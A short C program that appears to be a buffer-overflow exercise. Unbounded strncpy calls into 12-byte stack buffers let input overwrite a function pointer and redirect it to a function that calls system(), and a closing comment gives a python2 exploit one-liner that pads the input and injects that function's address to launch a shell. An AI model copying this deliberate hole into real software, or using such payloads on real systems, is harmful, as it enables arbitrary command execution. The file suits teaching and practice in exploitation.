#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int good_func(char *buffer)
{
    printf("%s\n", buffer);
    return 0;
}

int bad_func(char *buffer)
{
    system(buffer);
    return 0;
}

typedef int (*MYFUNC)(char *buffer);

int main(int argc, char *argv[])
{
    char buffer1[12];
    MYFUNC fct;
    char buffer2[12];

    fct = good_func;
    
    printf("a%sa\n", argv[2]);
    
    strncpy(buffer1, argv[1], strlen(argv[1]));
    strncpy(buffer2, argv[2], strlen(argv[2]));
    
    fct(buffer1);
    fct(buffer2);
    
    printf(
        "fct=%p fct2=%p buffer=%p fct=%p buffer=a%sa\n",
        bad_func,
        fct,
        buffer1,
        &fct,
        buffer1
    );

    printf("bad_func_address=%p.\n", bad_func);

    return 0;
}

// ./a.out $(python2 -c 'print ("sh"+ " " + "0"*12 + "\xd1\x91\x04\x08")')